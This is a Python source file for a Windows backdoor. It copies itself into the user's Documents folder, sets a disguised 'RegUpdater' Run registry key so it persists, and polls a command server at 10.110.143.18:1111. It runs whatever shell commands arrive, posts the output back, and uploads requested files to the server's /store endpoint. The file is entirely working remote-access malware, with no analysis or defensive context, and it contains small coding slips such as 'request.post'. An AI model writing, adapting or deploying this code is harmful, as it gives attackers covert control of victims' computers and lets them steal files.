import os,shutil,subprocess
import _winreg as wreg
import requests,time,random

path = os.getcwd().strip('/n')
null,userprof = subprocess.check_output("set USERPROFILE",shell=True).split('=')

destination = userprof.strip('\n\r') + '\\Documents\\' + 'persistence.exe'

if not os.path.exists(destination):
    shutil.copyfile(path + '\persistence.py',destination)

    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "SOFTWARE\Microsoft\Windows\CurrentVersion\Run",0,wreg.KEY_ALL_ACCESS)
    wreg.SetValueEx(key, 'RegUpdater' ,0,wreg.REG_SZ,destination)
    key.Close()
    
def connect():
    
    while True:
        req = requests.get('http://10.110.143.18:1111')
        command = req.text

        if 'terminate' in command:
            return 1

        elif 'grab' in command:
            grab,path = command.split('*')
            if os.path.exists(path):
                url = "http://10.110.143.18:1111/store"
                files = {'file': open(path,'rb')}
                r = request.post(url,files=files)
            else:
                request.post("http://10.110.143.18:1111",data="File was not found")
            
        else:
            cmd = subprocess.Popen(command, shell=True,stdout=subprocess.PIPE)
            post_response = requests.post(url='http://10.110.143.18:1111',data=cmd.stdout.read())
            time.sleep(3)

while True:
    try:
        if connect()==1:
            break
    except:
        sleep_for = random.randrange(1,10)
        time.sleep(sleep_for*10)
        pass

        
    
